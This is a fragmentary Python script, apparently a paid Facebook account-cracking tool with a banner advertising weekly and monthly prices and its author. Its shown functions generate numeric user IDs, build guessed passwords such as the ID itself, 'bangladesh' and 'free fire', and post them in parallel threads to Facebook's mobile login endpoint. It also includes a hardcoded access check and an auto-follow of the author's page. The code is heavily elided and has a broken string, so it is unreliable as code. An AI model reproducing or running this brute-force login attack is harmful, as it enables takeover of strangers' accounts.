...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/SKJIBON890', {
...
while attemps < 12345677901:
    ...
    if username == 'HASAN' and password == 'TASNIM:
...
\033[1;32m[-] TOOLS PRICE:\033[1;32m WEEKLY 350TK MONTHLY 650TK
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[1;32m SK JIBON HASAN
\033[1;32m[-] GITHUB    :\033[1;32m HASAN-CYBER-143
\033[1;32m[-] FACEBOOK  :\033[1;32m SK JIBON HASAN
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS HASAN IS BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
...
def C1():
    ...
    with ThreadPool(max_workers=30) as CYBER:
        ...
        print ('')
        for love  in user:
            pwx = [love ,love [2:],love [1:],code+love ,code+love [:3],'bangladesh','ilove you','free fire']
            uid = code+love 
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/?li=WZf4Y-5ptvqkGhzX8fnGGoQo&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
